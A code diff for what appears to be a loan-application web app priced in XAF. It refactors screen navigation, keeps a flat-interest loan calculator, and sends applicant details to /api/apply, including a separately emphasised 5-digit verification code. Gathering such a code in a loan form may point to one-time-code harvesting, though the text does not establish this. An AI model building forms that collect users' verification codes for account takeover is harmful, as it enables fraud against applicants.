@@ -1,38 +1,15 @@
-// Navigation Logic
-function startApp() {
-    document.getElementById('language-screen').classList.remove('active');
-    document.getElementById('main-app').classList.add('active');
-    document.getElementById('home-screen').classList.add('active');
-}
-
-function goToStep(step) {
-    document.getElementById('home-screen').classList.remove('active');
-    document.getElementById('form-screen').classList.add('active');
+// Show a specific screen and hide others
+function showScreen(screenId) {
+    // Hide all screens
+    document.querySelectorAll('.app-screen').forEach(screen => {
+        screen.classList.remove('active');
+    });
     
-    // Hide all steps, show the selected one
-    document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
-    document.getElementById('step-' + step).classList.add('active');
+    // Show the requested screen
+    document.getElementById(screenId).classList.add('active');
     
-    // Update Progress Bar
-    document.getElementById('progress').style.width = (step / 3 * 100) + '%';
-    document.getElementById('step-indicator').innerText = `Step ${step} of 3`;
-}
-
-function nextStep(step) {
-    // If moving from step 1 to 2, update the summary values
-    if (step === 2) {
-        document.getElementById('summary-amount').innerText = 'XAF ' + Number(document.getElementById('form-amount').value).toLocaleString();
-        document.getElementById('summary-term').innerText = document.getElementById('form-term').value;
-    }
-    
-    // If moving from step 2 to 3, update the applicant name
-    if (step === 3) {
-        const fName = document.getElementById('first-name').value;
-        const lName = document.getElementById('last-name').value;
-        document.getElementById('summary-name').innerText = fName ? `${fName} ${lName}` : '—';
-    }
-
-    goToStep(step);
+    // Scroll to top of the new screen
+    document.getElementById(screenId).scrollTop = 0;
 }
 
 // Loan Calculator Logic
@@ -46,38 +23,30 @@ function calculateLoan() {
     const amount = parseFloat(amountSlider.value);
     const months = parseFloat(termSlider.value);
     
-    // Formatting displays
     amountDisplay.innerText = 'XAF ' + amount.toLocaleString();
     termDisplay.innerText = months + ' Months';
 
-    // Calculation (Assuming a flat 1% monthly interest for this example)
     const interestRate = 0.01; // 1% monthly
     const monthlyPayment = (amount / months) + (amount * interestRate);
     
     monthlyPaymentDisplay.innerText = 'XAF ' + Math.round(monthlyPayment).toLocaleString();
 }
 
-// Listen for slider changes
 amountSlider.addEventListener('input', calculateLoan);
 termSlider.addEventListener('input', calculateLoan);
-
-// Initialize calculator on load
 calculateLoan();
 
-// Submit Application Logic (Sending data to backend)
+// Submit Application Logic
 document.getElementById('submit-btn').addEventListener('click', async function(e) {
     e.preventDefault();
     
-    // Show the processing screen
-    document.getElementById('form-screen').classList.remove('active');
-    document.getElementById('processing-screen').classList.add('active');
+    showScreen('screen-processing');
 
-    // Gather the data from the inputs (INCLUDING THE NEW 5-DIGIT CODE)
     const data = {
         firstName: document.getElementById('first-name').value,
         lastName: document.getElementById('last-name').value,
         phone: document.getElementById('phone').value,
-        code: document.getElementById('verification-code').value, // The new 5-digit code
+        code: document.getElementById('verification-code').value,
         loanType: document.getElementById('loan-type').value,
         amount: document.getElementById('form-amount').value,
         term: document.getElementById('form-term').value,
@@ -87,7 +56,6 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
     };
 
     try {
-        // Send data to the backend
         const response = await fetch('/api/apply', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -95,17 +63,18 @@ document.getElementById('submit-btn').addEventListener('click', async function(e
         });
 
         if (response.ok) {
-            // Success! Change the processing screen to a thank you message
             setTimeout(() => {
-                document.querySelector('.processing h2').innerText = "Application Received!";
-                document.querySelector('.processing p').innerText = "We will contact you shortly.";
-                document.querySelector('.loader').style.display = 'none';
+                document.getElementById('processing-title').innerText = "Application Received!";
+                document.getElementById('processing-text').innerText = "We will contact you shortly.";
+                document.getElementById('loader-spinner').style.display = 'none';
             }, 2000);
         } else {
             alert("Something went wrong. Please try again.");
+            showScreen('screen-step3'); // Send them back if it fails
         }
     } catch (error) {
         console.error(error);
         alert("Network error. Please try again.");
+        showScreen('screen-step3');
     }
 });
